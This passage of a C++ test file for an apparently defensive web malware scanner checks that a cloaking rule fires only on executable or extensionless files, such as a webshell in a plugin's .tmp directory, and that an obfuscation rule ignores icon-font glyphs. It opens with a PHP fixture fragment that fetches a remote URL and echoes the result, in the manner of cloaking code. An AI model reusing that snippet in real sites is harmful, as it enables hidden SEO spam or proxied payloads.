        "  $ch = curl_init($u); $r = curl_exec($ch); echo $r; exit;\n}\n"));
}

// SEO008's file-type gate: a readme that documents crawler user-agents is not code.
TEST(RescanRegressionTest, CloakingOnlyReportsExecutableFiles) {
    auto gated = [](std::string_view path) {
        MatchContext ctx;
        ctx.content = "irrelevant";
        ctx.filePath = path;
        ctx.matchOffset = 0;
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = "irrelevant";
        return MatchEngine::applyContextFilter("SEO008", ctx);
    };
    EXPECT_FALSE(gated("/var/www/plugins/wp-fastest-cache/readme.txt"));
    EXPECT_FALSE(gated("/var/www/plugins/x/CHANGELOG.md"));
    EXPECT_TRUE(gated("/var/www/index.php"));
    EXPECT_TRUE(gated("/var/www/wp-content/themes/x/functions.inc"));
    // A webshell routinely has no extension - one cloaker found this way was a bare
    // filename in a file manager plugin's .tmp directory.
    EXPECT_TRUE(gated("/var/www/plugins/filester/lib/files/.tmp/ELFRcMlAg"));
}

// OBF038: an icon font documents every glyph it defines as a quoted escape sequence,
// which is short and has the high character diversity that a hex string always has.
TEST(RescanRegressionTest, NoiseCommentsAreNotIconFontGlyphReferences) {
    std::string entypo = "@charset \"UTF-8\";\n";
    const char* glyphs[] = {"1f3b5", "1f50d", "1f526", "2709", "2605", "1f464", "1f465"};
    for (int i = 0; i < 40; ++i) {
        entypo += ".icon-" + std::to_string(i) + ":before { content: '\\" +
                  glyphs[i % 7] + "'; } /* '\\" + glyphs[i % 7] + "' */\n";
    }
    EXPECT_FALSE(ruleFires("OBF038", entypo));
}
